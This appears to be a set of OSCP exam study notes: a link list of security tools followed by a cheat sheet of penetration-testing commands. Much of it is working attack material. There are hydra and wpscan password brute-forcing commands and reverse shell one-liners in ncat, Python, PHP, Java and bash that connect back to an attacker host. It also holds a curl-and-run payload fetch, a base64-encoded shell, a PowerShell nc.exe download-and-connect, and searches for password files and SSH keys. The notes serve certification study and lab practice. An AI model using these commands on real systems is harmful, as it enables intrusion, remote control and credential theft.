## Useful Websites
[offical exam guide](https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) <br>
[offical exam report](https://www.offensive-security.com/pwk-online/PWK-Example-Report-v1.pdf) <br>
[pentest.ws](https://pentest.ws): note taking <br>
[Burp Suite](https://portswigger.net/burp): tool for exploring web security. [Configure browser with Burp Suite](https://www.youtube.com/results?search_query=Configure+with+Burp+Suite) <br>
[OWASP juice box](https://owasp.org/www-project-juice-shop/): OWASP security trainings<br>
[hack this site]<br>
[over the wire]<br>
[pwnable.kr/xyz]<br>
[hack the box]<br>
[cybrary]<br>
[google gruyeye]<br>
[game of hacks]<br>
[bWAPP]<br>
[Webgoat]<br>
[hashcat](https://hashcat.net/wiki/doku.php?id=hashcat): password recovery tool [rule_based_attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)<br>
[feroxbuster](https://github.com/epi052/feroxbuster): powerful forced browsing tool (gobuster、dirb)<br>
[AutoRecon](https://github.com/Tib3rius/AutoRecon): multi-threaded network reconnaissance tool which performs automated enumeration of services<br>
[explainshell](https://explainshell.com/): explain command-line<br>
[SecLists](https://github.com/danielmiessler/SecLists): It's a collection of multiple types of lists used during security assessments, collected in one place<br>
[Reverse Shell Generator](https://www.revshells.com/): online reverse shell generator<br>
[hacktricks](https://book.hacktricks.xyz/)<br>
[CyberChef](https://gchq.github.io/CyberChef/): a web app for encryption, encoding, compression and data analysis.<br>
[Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability)<br>
[exploit-notes.hdks.org](https://exploit-notes.hdks.org/)<br>
[cvexploits.io](https://cvexploits.io/): CVExploits Search<br>
[portswigger.net/web-security](https://portswigger.net/web-security): Learn various web security techniques.<br>
[offsec.tools](https://offsec.tools/): A vast collection of security tools for bug bounty, pentest and red teaming.<br>
[LOLBAS](https://lolbas-project.github.io/#): Living Off The Land Binaries, Scripts and Libraries <br>
[CAPEC](https://capec.mitre.org/index.html): Common Attack Pattern Enumerations and Classifications <br>
[Burp Suite](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study): Burp Suite Certified Practitioner Exam Study <br>
[BloodyAD](https://github.com/CravateRouge/bloodyAD): An Active Directory Privilege Escalation Framework <br>
[NetExec](https://github.com/Pennyw0rth/NetExec): The Network Execution Tool (CrackMapExec) <br>
[MITRE ATT&CK](https://attack.mitre.org/): ATT&CK Matrix for Enterprise <br>
[jadx](https://github.com/skylot/jadx): Dex to Java decompiler <br>
[nuclei](https://github.com/projectdiscovery/nuclei): Community Powered Vulnerability Scanner, [nuclei templates](https://github.com/projectdiscovery/nuclei-templates) <br>
[Tilix](https://gnunn1.github.io/tilix-web/): Tilix is a terminal emulator for Linux systems. It provides features such as support for split terminals, custom layouts, and a Quake-style drop-down mode. <br>
[API Penetration Testing](https://github.com/Cyber-Guy1/API-SecurityEmpire): Mindmaps, tips & tricks, resources <br>
[Assetnote Wordlists](https://wordlists.assetnote.io/)

## :warning: Exam Restrictions

[linPEAS](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/): Understanding the tools/scripts you use in a Pentest<br>
[Official Exam Guide](https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)<br>
[2022 Official OSCP Prep Guide](https://t.co/GItBMylfz9)

## :warning: Exam Change

[2022/1/11 Active Directory](https://www.offensive-security.com/offsec/oscp-exam-structure/)<br>
[2022/8/6 OSCP Bonus Points Update](https://www.offensive-security.com/offsec/sunsetting-pen-200-legacy-topic-exercises/)<br>
[2023/3/15 PEN-200 (PWK): Updated for 2023](https://www.offsec.com/offsec/pen-200-2023/)<br>
 - [FAQ](https://help.offensive-security.com/hc/en-us/articles/12483872278932-PEN-200-2023-FAQ)
 - The OSCP exam is not changing as part of the update, with the exception of the removal of the independent `Buffer Overflow` machine from the exam. After the new material has been available for six months, any content included in the new version of PWK will be eligible for inclusion on the exam.

## :hammer_and_wrench: Commands

### :open_file_folder: hydra

Make sure there are no maximum number of login attempts. To perform a manual check.

IMAP

```shell
hydra -L <usernameList> -P <passwordList> -s 143 -f <target ip> imap
# -f exit when a login/pass pair is found
# -s target port
```

PostgreSQL

```shell
hydra -l <username> -P <passwordList> <target ip> postgres
```

for normal connection

```shell
psql -U <username> -p 5432 -h <hostname or ip>
```

HTTP Basic Authentication 

```shell
hydra -l admin -P <passwordList> -s 80 -f <target ip> http-get /
# (/):default 
```

JSON

```shell
# Content-Type、Accept、Origin、X-Requested-With、Referer and CSRF checks、Cookies
# use cURL to check necessary headers
hydra -l admin -P <passwordList> <target ip> https-post-form "/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:F=401:H=Origin\: https\://test.com:H=Accept\: application/json, text/plain, */*:H=Content-Type\: application/json;charset=utf-8"
```

### :open_file_folder: cewl

get a list for password crackers

```shell
cewl -d 4 https://192.168.0.1 -w /tmp/wordlists.txt --with-numbers --lowercase
# -d depth
# --with-numbers: Accept words with numbers in as well as just letters
# --help
```

### :open_file_folder: nmap

[Timing Templates](https://nmap.org/book/performance-timing-templates.html)

[Host Discovery](https://nmap.org/book/man-host-discovery.html)

scan a subnet

```shell
# Note that if set too fast may affect the results
nmap -T3 192.168.10.0/24
```

scan all TCP ports and services

```shell
nmap -Pn -p- -sC -sV -T4 <target ip>
```

optimizing performance

```shell
nmap -p- --min-rate 1000 <target ip>
# --min-rate <number>: Send packets no slower than <number> per second

# and then specific port
nmap -p <target port> -sC -sV <target ip>

# UDP
nmap -p- --min-rate 1000 -sU <target ip>
```

### :open_file_folder: reverse shell

ncat 

```shell
ncat -e /bin/bash <attacker ip> <attacker port>
```

python3(file)

```Python
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<attacker ip>",<attacker port>)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"])
```

python(file)

```Python
#!/usr/bin/env python
import os
import sys
try: 
        os.system("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<attacker ip>\",<attacker port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'") 
except: 
        print 'ERROR...' 
sys.exit(0) 
```

When using the exploit file to pass command parameters fails

python

```Python
command = "echo '/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && /bin/bash /tmp/revshell.sh"
```

java

```Java
String[] cmdline = { "sh", "-c", "echo 'bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && bash /tmp/revshell.sh" }; 
Runtime.getRuntime().exec(cmdline);
```

php(file)

```Php
<?php system(\"nc -e /bin/bash <attacker ip> <attacker port>\"); ?>
```

```Php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'");?>
```

special cases 1 

```shell
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker ip> <attacker port> >/tmp/f
```

special cases 2

```shell
# rev.sh
# sh -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1
curl http://<attacker ip>/rev.sh -o /tmp/rev.sh
bash /tmp/rev.sh
```

base64

```shell
echo 'bash -c "bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1"' | base64
echo -n <base64 command string> | base64 -d | bash 
# echo -n cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyNy4wLjAuMSIsODApKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw== | base64 -d | bash      
```

Windows cmd

```cmd
REM https://www.revshells.com/ Powershell#3(Base64)
PowerShell.exe -command "powershell -e <base64 command string>"
```

### :open_file_folder: Cron jobs

```shell
crontab -l
```

```shell
ls -alh /etc/cron.* /etc/at*
```

```shell
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

unprivileged Linux process snooping: [pspy](https://github.com/DominicBreuker/pspy)

### :open_file_folder: WordPress 

[WPScan](https://github.com/wpscanteam/wpscan)

Finding application

```shell
wpscan --url http://192.168.0.1/
```

Enumerating valid usernames

```shell
wpscan --url http://192.168.0.1/ --enumerate u1-1000
```

Enumerating themes

```shell
wpscan --url http://192.168.0.1/ -e at
```

```shell
curl -k -s http://192.168.0.1/wp-content/themes/ | html2text
```

```shell
curl -s -X GET http://192.168.0.1 | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

Enumerating plugins

```shell
wpscan --url http://192.168.0.1/ -e ap
```

```shell
wpscan --url http://192.168.0.1/ -e ap --plugins-detection aggressive --api-token <api_key> -t 20 --verbose
# --api-token:display vulnerability data (not always necessary), register a uesr and get the api key from wpscan offical website
```

```shell
curl -k -s http://192.168.0.1/wp-content/plugins/ | html2text
```

```shell
curl -s -X GET http://192.168.0.1 | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

Brute-force attack

```shell
wpscan --url http://192.168.0.1/ --passwords /usr/share/wordlists/rockyou.txt --max-threads 50 --usernames admin
```

SSL peer certificate or SSH remote key was not valid

```shell
wpscan --url https://192.168.0.1/ --disable-tls-checks
```

### :open_file_folder: [LFI](https://github.com/tedchen0001/OSCP-Notes/blob/master/file_inclusion.md)

#### [LFI Suite](https://github.com/D35m0nd142/LFISuite)

file in Windows

```
C:\Windows\System32\drivers\etc\hosts
```

### :open_file_folder: AutoRecon

```shell
git clone https://github.com/Tib3rius/AutoRecon.git

cd AutoRecon

sudo python3 autorecon.py <target IP> --dirbuster.wordlist "" # skip directory busting to speed up results
```

### :open_file_folder: Wfuzz

find subdomains

```shell
wfuzz -H 'Host: FUZZ.test.com' -u http://test.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 407
# hw:hide responses words
```

need to authenticate

```shell
# php example
wfuzz -H 'Cookie: PHPSESSID=<fill in the PHPSESSID>' -u https://<target ip>/<folder>/?FUZZ= -w <wordlist> --hw <value>
```

post requests

```shell
wfuzz -z file,<wordlist> -d "username=admin&password=FUZZ" --hc 302 <url>
# -d postdata
# -z file,wordlist
# hc:hide responses code
```

### :open_file_folder: hashcat

create new password list

```shell
echo -n "passwordstring" > /tmp/oldPass
# -n: do not output the trailing newline

hashcat -r /usr/share/hashcat/rules/best64.rule --stdout /tmp/oldPass > /tmp/newPassList.txt
```

MD5

```cmd
REM Try using m=0
 .\hashcat.exe -a 0 -m 0 .\hash .\rockyou.txt
```

## 🖥️ Linux

Typical site folders

```
/srv/http/
/var/www/html/
```

avoid permission denied messages

```shell
find / -name *kali* 2>&-
```

[Writable file](https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/)

```shell
find / -writable -type f 2>/dev/null | grep -v "/proc/"
```

find files containing specific text

```shell
find / -type f \( -iname \*.php -o -iname \*.config -o -iname \*.conf -o -iname \*.ini -o -iname \*.txt \) -exec grep -i 'password\|passwd' {} \; -print 2>&-
```

finding SUID executables

```shell
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

find ssh key

```shell
find / -type f -name id_rsa* 2>&-
```

group capabilities

```shell
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),143(kaboxer)
find / -group <name> 2>/dev/null
# find / -group wireshark 2>/dev/null
```

locate and execute the file

```
find / -name "*.log" 2>/dev/null -exec cat {} \; 
```

upgrade reverse shell in Kali

```shell
# 1.switch to bash
bash
nc -nlvp <local port>
# 2
/usr/bin/script -qc /bin/bash /dev/null
# 3
script -c "/bin/bash -i" /dev/null
```

```shell
# chsh - change your login shell
chsh /bin/bash
# full pathnames of valid login shells
cat /etc/shells
# 1.finding current shell
echo $0
# 2.finding current shell 
/proc/self/exe --version
```

## 🖥️ Windows

[icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls): Performs the operation on all specified files in the current directory and its subdirectories.

```
icacls <directory> /t
```

Remarks

```
A sequence of simple rights:

F - Full access

M - Modify access

RX - Read and execute access

R - Read-only access

W - Write-only access
```

download file

```
certutil -f -urlcache <URL> <local filename>
powershell -Command "Invoke-WebRequest '<URL>' -OutFile <filename>"
powershell -Command "Invoke-WebRequest \"<URL>\" -OutFile <filename>"
```

get file hash

```
certutil -hashfile <file> MD5
```

find files containing specific text

```cmd
findstr /si password C:\*.xml C:\*.ini C:\*.txt C:\*.config C:\*.conf
```

### :open_file_folder: PowerShell

bypass

```powershell
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass C:\Windows\Temp\xxx.ps1
```

zip

```powershell
Compress-Archive -Path C:\Users\guest\Desktop\dist -DestinationPath C:\Users\guest\Desktop\dist
```

unzip

```powershell
Expand-Archive -LiteralPath C:\Users\guest\Desktop\dist.zip -DestinationPath C:\Users\guest\Desktop
```

reverse shell

```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.100/nc.exe', 'C:\users\XXX\desktop\nc.exe');C:\users\XXX\desktop\nc.exe 192.168.0.100 80 -e cmd"
```

find specific files

```powershell
Get-ChildItem -Path "C:\Folder" -Recurse -Force -Filter "*.txt"
Get-ChildItem -Path "C:\Folder" -Recurse -Force -Include "*.txt","*.zip","*.conf"
```

### :open_file_folder: Firefox

disable search in address bar function, easier to test

```
type in searchBar "about:config"
Accept warning
Search "keyword.enabled" and change it to false
```

modify header tool (or Burp Suite)

https://addons.mozilla.org/en-US/firefox/addon/simple-modify-header/

### :open_file_folder: others

```
C:\Windows\SysWOW64
C:\Windows\System32
C:\Windows\System32\drivers\etc\hosts
```

### :open_file_folder: [IIS-ShortName-Scanner](https://github.com/irsdl/iis-shortname-scanner)
